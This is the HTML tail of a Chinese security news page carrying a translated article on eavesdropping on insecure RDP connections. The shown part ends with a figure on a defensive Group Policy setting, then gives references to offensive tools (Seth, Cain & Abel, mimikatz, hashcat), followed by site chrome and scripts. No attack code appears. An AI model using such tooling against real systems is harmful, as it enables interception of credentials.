YaHei&#39;;">如果您有任何其他问题或意见，请随时与我们联系。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t015d47c9f285e3e84a.png" title="t015d47c9f285e3e84a.png" alt="http://p1.qhimg.com/t015d47c9f285e3e84a.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图7：一个关键的GPO设置：为客户端配置服务器验证&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">参考资料&nbsp;</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">[1] Vollmer, A., Github.com: Seth (2017), <a href="https://github.com/SySS-Research/Seth" _src="https://github.com/SySS-Research/Seth">https://github.com/SySS-Research/Seth</a>&nbsp; &nbsp;(Cited on</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">page 2.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[2] Montoro M., Cain &amp; Abel (2014), <a href="http://www.oxid.it/cain.html" _src="http://www.oxid.it/cain.html">http://www.oxid.it/cain.html</a>&nbsp; &nbsp;(Cited on page 2.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[3] Wikipedia contributors, Finite group, </span><a href="https://en.wikipedia.org/w/index.php?title=Finite_group&oldid=768290355" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://en.wikipedia.org/w/index.php?title=Finit</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">e_group&amp;oldid=768290355</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> &nbsp; &nbsp;(accessed March 8, 2017) (Cited on page 5.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[4] Wikipedia contributors, Shor’s algorithm (accessed March 8, 2017), </span><a href="https://en.wikipedia.org/w/index.php?title=Shor%27s_algorithm&oldid=767553912" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://en.wikipedia.org/w</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">/index.php?title=Shor%27s_algorithm&amp;oldid=767553912</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> &nbsp; (Cited on page 5.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[5] Shor, P. W., Polynomial-Time Algorithms for Prime Factorization and Discrete Logarithms on a Quantum</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">Computer (1995), <a href="https://arxiv.org/abs/quant-ph/9508027v2" _src="https://arxiv.org/abs/quant-ph/9508027v2">https://arxiv.org/abs/quant-ph/9508027v2</a>&nbsp; &nbsp;(Cited on page 5.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[6] Microsoft Developer Network, [MS-RDPBCGR]: Non-FIPS (2017), </span><a href="https://msdn.microsoft.com/en-us/library/cc240785.aspx" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://msdn.microsoft.com/e</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">n-us/library/cc240785.aspx</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> (Cited on pages 6 and 9.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[7] Schneier, B., Why Cryptography Is Harder Than It Looks (1997), </span><a href="https://www.schneier.com/essays/archives/1997/01/why_cryptography_is.html" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://www.schneier.com/essay</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">s/archives/1997/01/why_cryptography_is.html </span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">(Cited on page 6.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[8] Microsoft Developer Network, [MS-RDPBCGR]: Terminal Services Signing Key (2017), </span><a href="https://msdn.microsoft.com/en-us/library/cc240776.aspx" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://msdn.m</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">icrosoft.com/en-us/library/cc240776.aspx</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> &nbsp;(Cited on pages 6 and 8.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[9] Microsoft Developer Network, [MS-RDPBCGR]: Encrypting and Decrypting the I/O Data Stream (2017),</span><a href="https://msdn.microsoft.com/en-us/library/cc240787.aspx" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">https://msdn.microsoft.com/en-us/library/cc240787.aspx</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> (Cited on page 6.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[10] Microsoft Developer Network, [MS-RDPBCGR]: Server Security Data (TS_UD_SC_SEC1) (2017), </span><a href="https://msdn.microsoft.com/en-us/library/cc240518.aspx" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https:</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">//msdn.microsoft.com/en-us/library/cc240518.aspx</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> (Cited on page 7.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[11] Microsoft Developer Network, [MS-RDPBCGR]: Signing a Proprietary Certificate (2017), </span><a href="https://msdn.microsoft.com/en-us/library/cc240778.aspx" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://msdn</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">.microsoft.com/en-us/library/cc240778.aspx</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> &nbsp;(Cited on page 8.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[12] Microsoft Developer Network, [MS-RDPBCGR]: Client Input Event PDU Data (TS_INPUT_PDU_DATA)</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">(2017), <a href="https://msdn.microsoft.com/en-us/library/cc746160.aspx" _src="https://msdn.microsoft.com/en-us/library/cc746160.aspx">https://msdn.microsoft.com/en-us/library/cc746160.aspx</a>&nbsp; &nbsp;(Cited on page 10.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[13] Microsoft Developer Network, [MS-RDPBCGR]: Keyboard Event (TS_KEYBOARD_EVENT) (2017), </span><a href="https://msdn.microsoft.com/en-us/library/cc240584.aspx" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https:</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">//msdn.microsoft.com/en-us/library/cc240584.aspx</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> (Cited on page 11.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[14] Brouwer, A., Keyboard Scancodes (2009), </span><a href="https://www.win.tue.nl/~aeb/linux/kbd/scancodes-10.html#ss10.6" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://www.win.tue.nl/~aeb/linux/kbd/scanc</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">odes-10.html#ss10.6</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> (Cited on page 11.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[15] Microsoft Developer Network, Microsoft NTLM (2017), </span><a href="https://msdn.microsoft.com/en-us/library/aa378749%28VS.85%29.aspx" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://msdn.microsoft.com/en-us/l</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">ibrary/aa378749%28VS.85%29.aspx</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> (Cited on page 14.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[16] Weeks, M., Attacking Windows Fallback Authentication (2015), </span><a href="https://www.root9b.com/sites/default/files/whitepapers/R9B_blog_003_whitepaper_01.pdf" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://www.root9b.com/sites</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">/default/files/whitepapers/R9B_blog_003_whitepaper_01.pdf</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> &nbsp;(Cited on page 14.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[17] Hashcat, <a href="https://hashcat.net/hashcat/" _src="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a>&nbsp; &nbsp;(Cited on page 14.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[18] John The Ripper, <a href="http://www.openwall.com/john/" _src="http://www.openwall.com/john/">http://www.openwall.com/john/</a>&nbsp; &nbsp;(Cited on page 14.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[19] Microsoft Developer Network, [MS-CSSP]: TSRequest (2017), </span><a href="https://msdn.microsoft.com/enus/library/cc226780.aspx" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://msdn.microsoft.com/en</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">us/library/cc226780.aspx</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> (Cited on page 15.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[20] Microsoft Technet, Security (2017), </span><a href="https://technet.microsoft.com/en-us/library/cc771869(v=ws.10).aspx" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://technet.microsoft.com/en-us/library/cc7</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">71869(v=ws.10).aspx</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> (Cited on page 18.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[21] Microsoft Technet, Network Security: Restrict NTLM: NTLM authentication in this domain (2017), </span><a href="https://technet.microsoft.com/en-us/library/jj852241(v=ws.11).aspx" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https:</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">//technet.microsoft.com/en-us/library/jj852241(v=ws.11).aspx</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> (Not cited.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[22] Microsoft Technet, Remote Desktop Connection Client (2017), </span><a href="https://technet.microsoft.com/en-us/library/cc753945(v=ws.10).aspx" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://technet.microsoft.com/</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">en-us/library/cc753945(v=ws.10).aspx</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> (Cited on page 18.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[23] Vollmer, A., Github.com: clone-cert.sh (2017), &nbsp;</span><a href="https://github.com/SySS-Research/clonecert" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://github.com/SySS-Research/clone</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">cert</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> &nbsp;(Cited on page 16.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[24] Delpy, B., Github.com: mimikatz (2017), <a href="https://github.com/gentilkiwi/mimikatz" _src="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a>&nbsp; &nbsp;(Cited on</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">page 18.)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">[25] Microsoft Technet, Security Bulletin MS12-020 (2012), </span><a href="https://technet.microsoft.com/enus/library/security/ms12-020.aspx" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://technet.microsoft.com/en</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">us/library/security/ms12-020.aspx</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"> (Cited on page 18.)</span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://www.exploit-db.com/docs/41621.pdf" target="_blank">原文链接：https://www.exploit-db.com/docs/41621.pdf</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】攻击RDP——如何窃听不安全的RDP连接  - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3642" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
